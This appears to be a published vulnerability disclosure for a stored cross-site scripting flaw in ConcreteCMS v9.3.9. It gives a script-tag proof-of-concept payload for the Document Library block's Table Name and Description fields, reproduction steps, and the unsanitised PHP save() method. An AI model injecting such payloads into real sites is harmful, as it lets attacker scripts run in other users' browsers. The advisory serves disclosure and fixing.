# Exploit Title: Concretecms v9.3.9 - Cross-Site Scripting (XSS)
## Date: 3/13/2025
## Vendor Homepage: https://github.com/concretecms/concretecms
## Tested on: Debian Linux, Apache, Mysql
## Vendor: Concretecms
## Version: v9.3.9
## Exploit Description:
## ConcreteCMS v9.3.9 suffers from a Stored Cross-Site Scripting (XSS) vulnerability in the Table Name field、Table Description field when adding a Document Library block. This vulnerability allows attackers to cheat other users by injecting malicious scripts into web pages viewed by other users.

## ---------------------------------POC-----------------------------

```
<script>alert('Name');</script>
<script>alert('Description');</script>
```

1. Log in as a user with page editing privileges.
2. Click "add content to the page" in the top navigation.
3. Select the Document Library block , drag and drop it to the page.
4. Add <script>alert('...');</script> to the Table Name field、Table Description field and then click ADD,the xss vulnerability appears.

Potentially problematic source code:
```php
public function save($args)
    {
        $args += [
            'folderID' => null,
            'viewProperties' => null,
            'searchProperties' => null,
            'expandableProperties' => null,
            'fsID' => null,
            'setMode' => null,
            'tags' => null,
            'orderBy' => null,
            'displayLimit' => null,
            'maxThumbWidth' => null,
            'maxThumbHeight' => null,
            'heightMode' => null,
            'downloadFileMethod' => null,
            'fixedHeightSize' => null,
            'headerBackgroundColor' => null,
            'addFilesToSetID' => 0,
            'headerBackgroundColorActiveSort' => null,
            'headerTextColor' => null,
            'tableName' => '',
            'tableDescription' => '',
            'rowBackgroundColorAlternate' => null,
        ];

        $data = [
            'folderID' => $args['folderID'],
            'viewProperties' => json_encode(is_array($args['viewProperties']) ? $args['viewProperties'] : []),
            'searchProperties' => json_encode(is_array($args['searchProperties']) ? $args['searchProperties'] : []),
            'expandableProperties' => json_encode(is_array($args['expandableProperties']) ? $args['expandableProperties'] : []),
            'setIds' => json_encode(is_array($args['fsID']) ? $args['fsID'] : []),
            'setMode' => $args['setMode'] == 'all' ? 'all' : 'any',
            'onlyCurrentUser' => empty($args['onlyCurrentUser']) ? 0 : 1,
            'allowInPageFileManagement' => empty($args['allowInPageFileManagement']) ? 0 : 1,
            'allowFileUploading' => empty($args['allowFileUploading']) ? 0 : 1,
            'tags' => $args['tags'],
            'orderBy' => $args['orderBy'],
            'displayLimit' => $args['displayLimit'],
            'displayOrderDesc' => empty($args['displayOrderDesc']) ? 0 : 1,
            'maxThumbWidth' => (int) $args['maxThumbWidth'],
            'maxThumbHeight' => (int) $args['maxThumbHeight'],
            'enableSearch' => empty($args['enableSearch']) ? 0 : 1,
            'heightMode' => $args['heightMode'] == 'fixed' ? 'fixed' : 'auto',
            'downloadFileMethod' => $args['downloadFileMethod'] == 'force' ? 'force' : 'browser',
            'fixedHeightSize' => (int) $args['fixedHeightSize'],
            'headerBackgroundColor' => $args['headerBackgroundColor'],
            'addFilesToSetID' => 0,
            'headerBackgroundColorActiveSort' => $args['headerBackgroundColorActiveSort'],
            'headerTextColor' => $args['headerTextColor'],
            'tableName' => $args['tableName'],
            'tableDescription' => $args['tableDescription'],
            'tableStriped' => empty($args['tableStriped']) ? 0 : 1,
            'rowBackgroundColorAlternate' => empty($args['tableStriped']) ? '' : $args['rowBackgroundColorAlternate'],
            'hideFolders' => (int) !filter_var(array_get($args, 'showFolders'), FILTER_VALIDATE_BOOLEAN),
        ];
        if ((int) $args['addFilesToSetID'] > 0) {
            $fs = \FileSet::getByID($args['addFilesToSetID']);
            if (is_object($fs)) {
                $fsp = new \Permissions($fs);
                if ($fsp->canAddFiles() && $fsp->canSearchFiles()) {
                    $data['addFilesToSetID'] = $fs->getFileSetID();
                }
            }
        }
        parent::save($data);
    }
```